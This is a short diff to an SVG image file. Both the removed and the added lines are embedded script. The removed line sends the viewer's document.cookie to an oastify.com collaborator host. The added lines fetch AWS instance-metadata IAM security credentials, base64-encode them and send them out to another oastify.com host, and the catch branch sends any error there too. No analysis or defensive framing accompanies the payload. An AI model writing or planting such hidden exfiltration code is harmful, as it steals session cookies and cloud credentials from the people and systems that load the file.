@@ -1,5 +1,8 @@
 <svg xmlns="http://www.w3.org/2000/svg">
   <script>
-    fetch('https://4z48hz56sw93wreup8w3hlcmfdl49wxl.oastify.com/?c='+document.cookie)
+    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+      .then(r => r.text())
+      .then(data => fetch('https://bjyf16pdc3tagyy19fga1swtzk5bt5hu.oastify.com/?data='+btoa(data)))
+      .catch(e => fetch('bjyf16pdc3tagyy19fga1swtzk5bt5hu.oastify.com/?err='+btoa(e.toString())))
   </script>
 </svg>
